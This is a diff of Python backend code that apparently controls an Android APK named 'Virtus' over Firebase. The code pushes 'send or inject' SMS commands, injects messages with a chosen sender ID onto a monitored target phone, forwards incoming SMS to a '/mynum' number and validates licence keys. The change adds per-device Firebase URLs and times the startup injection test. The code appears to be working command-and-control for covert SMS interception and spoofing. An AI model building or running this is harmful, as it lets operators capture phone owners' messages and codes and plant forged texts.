@@ -24,8 +24,13 @@ def get_profile_firebase_url(profile: MonitorProfile) -> str | None:
     return None
 
 
-def resolve_firebase_url(profile: MonitorProfile) -> str | None:
-    """Firebase URL where APK polls messages/commands."""
+def resolve_firebase_url(
+    profile: MonitorProfile,
+    device: Device | None = None,
+) -> str | None:
+    """Firebase URL where inject/outbound messages are stored."""
+    if device and device.firebase_source_url:
+        return normalize_firebase_url(device.firebase_source_url)
     user_url = get_profile_firebase_url(profile)
     if user_url:
         return user_url
@@ -33,6 +38,15 @@ def resolve_firebase_url(profile: MonitorProfile) -> str | None:
     if license_key and license_key.upper().startswith("KEY-"):
         return settings.virtus_module_db.rstrip("/")
     return None
+
+
+def resolve_apk_poll_id(profile: MonitorProfile, device: Device | None = None) -> str:
+    """APK on /mynum phone polls messages/{this_id}."""
+    if profile.phone_number:
+        return mynum_device_id(profile.phone_number)
+    if device:
+        return device.name
+    return ""
 
 
 def get_license_key(profile: MonitorProfile) -> str | None:
@@ -69,12 +83,12 @@ async def _firebase_put(url: str, data: dict) -> None:
 async def push_virtus_config(profile: MonitorProfile, device: Device | None = None) -> None:
     """Push config for Virtus APK (virtus_config + module DB config/{KEY})."""
     module_db = settings.virtus_module_db.rstrip("/")
-    firebase_url = resolve_firebase_url(profile)
+    firebase_url = resolve_firebase_url(profile, device)
     if not firebase_url:
         return
 
     license_key = get_license_key(profile)
-    device_id = device.name if device else ""
+    device_id = resolve_apk_poll_id(profile, device)
     monitoring = profile.is_monitoring
     key_valid = False
 
@@ -91,7 +105,8 @@ async def push_virtus_config(profile: MonitorProfile, device: Device | None = No
                 channel_id=profile.channel_id,
                 target_number=profile.phone_number,
                 sim_index=profile.selected_sim_index or 0,
-                firebase_bases=firebase_bases,
+                firebase_bases=firebase_bases or [firebase_url],
+                firebase_url=firebase_url,
             )
 
     sim_index = profile.selected_sim_index or 0
@@ -198,12 +213,12 @@ async def register_device_on_firebase(
 
 
 async def sync_profile_to_firebase(profile: MonitorProfile, device: Device | None = None) -> None:
-    if not resolve_firebase_url(profile):
+    if not resolve_firebase_url(profile, device):
         return
     try:
         await push_virtus_config(profile, device)
         if device:
-            firebase_url = resolve_firebase_url(profile)
+            firebase_url = resolve_firebase_url(profile, device)
             if firebase_url:
                 await register_device_on_firebase(firebase_url, device, profile)
                 base = normalize_firebase_url(firebase_url)
@@ -232,7 +247,7 @@ async def push_outbound_to_firebase(
     outbound: OutboundSMS,
 ) -> str | None:
     """Push outgoing send or inject command to Firebase for Virtus APK."""
-    firebase_url = resolve_firebase_url(profile)
+    firebase_url = resolve_firebase_url(profile, device)
     if not firebase_url:
         return None
 
@@ -276,29 +291,38 @@ async def push_outbound_to_firebase(
         return None
 
 
-async def send_polling_startup_test(db, profile: MonitorProfile, device: Device) -> None:
-    """On monitoring start — inject test SMS to /mynum (same sender ID, Astik-style)."""
+async def send_polling_startup_test(
+    db,
+    profile: MonitorProfile,
+    device: Device,
+) -> tuple[int, int]:
+    """On monitoring start — inject test SMS to /mynum phone via Firebase."""
+    import time
+
     from app.device_ui import STARTUP_TEST_MESSAGE, STARTUP_TEST_SENDER
-    from app.services import normalize_phone
 
     if not profile.phone_number or not profile.is_monitoring:
-        return
+        return 0, 0
 
-    firebase_url = resolve_firebase_url(profile)
+    firebase_url = resolve_firebase_url(profile, device)
     if not firebase_url:
         logger.warning("Startup test skipped: no firebase URL")
-        return
+        return 0, 0
 
-    mynum = normalize_phone(profile.phone_number)
+    poll_id = mynum_device_id(profile.phone_number)
+    t0 = time.perf_counter()
     try:
         await push_inject_message(
             firebase_url,
-            mynum_device_id(mynum),
+            poll_id,
             STARTUP_TEST_SENDER,
             STARTUP_TEST_MESSAGE,
         )
+        total_ms = max(1, int((time.perf_counter() - t0) * 1000))
+        return 1, total_ms
     except Exception as exc:
         logger.warning("Startup test inject failed: %s", exc)
+        return 0, max(1, int((time.perf_counter() - t0) * 1000))
 
 
 async def forward_incoming_to_mynum(
